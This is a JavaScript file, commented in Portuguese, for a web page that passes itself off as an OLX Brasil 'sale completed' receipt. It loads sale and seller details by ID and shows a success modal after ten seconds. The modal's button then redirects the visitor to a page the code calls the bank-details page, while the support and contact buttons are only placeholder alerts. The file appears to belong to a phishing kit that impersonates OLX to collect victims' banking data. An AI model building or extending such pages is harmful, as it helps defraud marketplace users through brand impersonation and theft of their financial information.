document.addEventListener("DOMContentLoaded", function () {
  // Obter ID da URL
  const params = new URLSearchParams(window.location.search);
  const vendaId = params.get("id");

  if (!vendaId) {
    // Sem ID na URL, mostrar mensagem de erro
    mostrarErro();
    return;
  }

  // Carregar dados da venda
  buscarDadosVenda(vendaId);

  // Adicionar event listeners para botões
  adicionarEventListeners();

  // Mostrar modal de sucesso após 10 segundos
  setTimeout(() => {
    const modal = document.getElementById("sucesso-modal");
    modal.classList.remove("hidden");
    setTimeout(() => {
      modal.classList.add("show");
    }, 50);
  }, 10000);
});

async function buscarDadosVenda(id) {
  try {
    const response = await fetch(`/api/venda/${id}`);

    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.error || "Venda não encontrada");
    }

    const venda = await response.json();
    preencherDadosVenda(venda);
  } catch (error) {
    console.error("Erro ao buscar dados da venda:", error);
    mostrarErro();
  }
}

function preencherDadosVenda(venda) {
  // Preencher dados do produto
  document.getElementById("produto-nome").textContent = venda.produto;
  document.getElementById(
    "produto-valor"
  ).textContent = `R$ ${venda.valor.toLocaleString("pt-BR")}`;
  document.getElementById("produto-data").textContent = venda.dataVenda;

  // Configura as imagens do produto
  const imagemPrincipalEl = document.getElementById("produto-imagem-principal");
  const galeriaMiniaturasEl = document.getElementById("galeria-miniaturas");

  if (galeriaMiniaturasEl) {
    galeriaMiniaturasEl.innerHTML = ""; // Limpa miniaturas existentes
  }

  // Verifica se imagem é um array ou uma string e trata adequadamente
  if (Array.isArray(venda.imagem) && venda.imagem.length > 0) {
    // Define a imagem principal
    imagemPrincipalEl.src = venda.imagem[0];
    imagemPrincipalEl.alt = venda.produto;

    // Adicionar handler de erro para a imagem principal
    imagemPrincipalEl.onerror = function () {
      this.src = "/images/produto-placeholder.jpg";
      this.onerror = function () {
        const canvas = document.createElement("canvas");
        canvas.width = 400;
        canvas.height = 300;
        const ctx = canvas.getContext("2d");
        ctx.fillStyle = "#f0f0f0";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#6e0ad6";
        ctx.font = "20px Arial";
        ctx.textAlign = "center";
        ctx.fillText(
          venda.produto || "Produto OLX",
          canvas.width / 2,
          canvas.height / 2
        );
        this.src = canvas.toDataURL("image/png");
      };
    };

    // Cria as miniaturas
    venda.imagem.forEach((imgSrc, index) => {
      const miniatura = document.createElement("img");
      miniatura.src = imgSrc;
      miniatura.alt = `${venda.produto} - Imagem ${index + 1}`;
      miniatura.classList.add("miniatura");
      if (index === 0) miniatura.classList.add("ativa");

      // Adicionar handlers para mouse e touch
      function ativarMiniatura() {
        imagemPrincipalEl.src = imgSrc;
        document
          .querySelectorAll(".miniatura")
          .forEach((m) => m.classList.remove("ativa"));
        miniatura.classList.add("ativa");
      }

      miniatura.addEventListener("click", ativarMiniatura);
      miniatura.addEventListener("touchend", function (e) {
        e.preventDefault();
        ativarMiniatura();
      });

      // Tratamento de erro para a miniatura
      miniatura.onerror = function () {
        this.src = "/images/produto-placeholder.jpg";
      };

      galeriaMiniaturasEl.appendChild(miniatura);
    });
  } else if (typeof venda.imagem === "string") {
    imagemPrincipalEl.src = `/images/${venda.imagem}`;
    imagemPrincipalEl.alt = venda.produto;

    // Adicionar handler de erro
    imagemPrincipalEl.onerror = function () {
      this.src = "/images/produto-placeholder.jpg";
    };
  }

  // Preencher dados do vendedor
  document.getElementById("vendedor-nome").textContent = venda.vendedor.nome;
  document.getElementById("vendedor-localizacao").textContent =
    venda.vendedor.localizacao;
  document.getElementById("vendedor-avaliacao").textContent =
    venda.vendedor.avaliacao.toFixed(1);
  document.getElementById("vendedor-produtos").textContent =
    venda.vendedor.produtosVendidos;
  document.getElementById("vendedor-inicial").textContent =
    venda.vendedor.nome.charAt(0);

  // Definir número correto de estrelas preenchidas
  const avaliacao = Math.round(venda.vendedor.avaliacao);
  const estrelas = document.querySelectorAll(".estrela");
  estrelas.forEach((estrela, i) => {
    if (i < avaliacao) {
      estrela.classList.add("preenchida");
    } else {
      estrela.classList.add("vazia");
    }
  });

  // Preencher dados do comprador
  document.getElementById("comprador-nome").textContent = venda.comprador;

  // Preencher código e plataforma
  document.getElementById("venda-codigo").textContent = venda.codigo;
  document.getElementById("venda-codigo-small").textContent = venda.codigo;
  document.getElementById("venda-plataforma").textContent = venda.plataforma;

  // Atualizar título da página
  document.title = `${venda.produto} - Venda Concluída | OLX Brasil`;
}

function adicionarEventListeners() {
  // Botão imprimir comprovante
  const btnImprimir = document.querySelector(".btn-imprimir");
  if (btnImprimir) {
    btnImprimir.addEventListener("click", () => {
      window.print();
    });
  }

  // Botão reportar problema
  const btnReportar = document.querySelector(".btn-reportar");
  if (btnReportar) {
    btnReportar.addEventListener("click", () => {
      alert(
        "Esta funcionalidade entrará em contato com o suporte da OLX. Em um ambiente real, isso abriria um formulário de suporte."
      );
    });
  }

  // Botão avaliar transação
  const btnAvaliar = document.querySelector(".btn-avaliar");
  if (btnAvaliar) {
    btnAvaliar.addEventListener("click", () => {
      alert(
        "Em um ambiente real, isso abriria um formulário de avaliação da transação."
      );
    });
  }

  // Botão voltar (na tela de erro)
  const btnVoltar = document.querySelector(".btn-voltar");
  if (btnVoltar) {
    btnVoltar.addEventListener("click", () => {
      window.location.href = "/";
    });
  }

  // Botão contatar vendedor
  const btnContato = document.querySelector(".btn-contato");
  if (btnContato) {
    btnContato.addEventListener("click", () => {
      alert(
        "Em um ambiente real, isso abriria um chat ou formulário de contato com o vendedor."
      );
    });
  }

  // Botão continuar do modal de sucesso
  const btnContinuar = document.getElementById("btn-continuar");
  if (btnContinuar) {
    btnContinuar.addEventListener("click", () => {
      const modal = document.getElementById("sucesso-modal");
      modal.classList.remove("show");

      // Obtém o ID atual da URL para usar no redirecionamento
      const params = new URLSearchParams(window.location.search);
      const vendaId = params.get("id") || "KFTKWNQVMD"; // ID padrão caso não exista

      // Redireciona para a página de dados bancários (usando .html em vez de .php)
      console.log(`Redirecionando para /pag/dados.html?id=${vendaId}`);
      window.location.href = `/pag/dados.html?id=${vendaId}`;
    });
  }
}

function mostrarErro() {
  // Esconder o conteúdo principal
  document.querySelector(".main-content").style.display = "none";
  document.querySelector(".sucesso-banner").style.display = "none";
  document.querySelector(".dicas-seguranca").style.display = "none";

  // Mostrar mensagem de erro
  document.getElementById("erro-container").classList.remove("hidden");
}

// Adicionar toasts informativos ao carregar a página
function mostrarToast(mensagem, tipo = "info") {
  const toast = document.createElement("div");
  toast.className = `toast toast-${tipo}`;
  toast.innerHTML = `
    <div class="toast-content">
      <i class="fas ${
        tipo === "info" ? "fa-info-circle" : "fa-check-circle"
      }"></i>
      <p>${mensagem}</p>
    </div>
    <button class="toast-close"><i class="fas fa-times"></i></button>
  `;

  document.body.appendChild(toast);

  setTimeout(() => {
    toast.classList.add("show");
  }, 100);

  setTimeout(() => {
    toast.classList.remove("show");
    setTimeout(() => {
      document.body.removeChild(toast);
    }, 300);
  }, 5000);

  toast.querySelector(".toast-close").addEventListener("click", () => {
    toast.classList.remove("show");
    setTimeout(() => {
      document.body.removeChild(toast);
    }, 300);
  });
}

// Pequena animação para mostrar que a página está completamente carregada
window.addEventListener("load", () => {
  setTimeout(() => {
    mostrarToast("Página de venda carregada com sucesso!", "success");
  }, 1000);
});

// Função para detectar se o dispositivo é móvel
function isMobileDevice() {
  return (
    window.innerWidth <= 768 ||
    typeof window.orientation !== "undefined" ||
    navigator.userAgent.indexOf("Mobile") !== -1 ||
    navigator.userAgent.indexOf("Android") !== -1
  );
}

// Adaptar a interface se for um dispositivo móvel
function adaptarParaDispositivoMovel() {
  if (isMobileDevice()) {
    // Simplificar algumas partes da interface
    const miniaturas = document.querySelectorAll(".miniatura");
    if (miniaturas.length > 4) {
      // Em dispositivos móveis, limitar o número de miniaturas visíveis
      const galeriaMiniaturasEl = document.getElementById("galeria-miniaturas");
      if (galeriaMiniaturasEl) {
        galeriaMiniaturasEl.style.justifyContent = "flex-start";
        galeriaMiniaturasEl.style.overflowX = "auto";
        galeriaMiniaturasEl.style.webkitOverflowScrolling = "touch";
      }
    }
  }
}

// Executar ao carregar a página
document.addEventListener("DOMContentLoaded", function () {
  adaptarParaDispositivoMovel();

  // Verificar se a página de produtos está sendo carregada
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.has("codigo")) {
    // Código já está sendo tratado no script em index.html
    console.log("Carregando produto por código URL");
  }
});

// Adicionar evento de redimensionamento para ajustar a interface responsivamente
window.addEventListener("resize", adaptarParaDispositivoMovel);
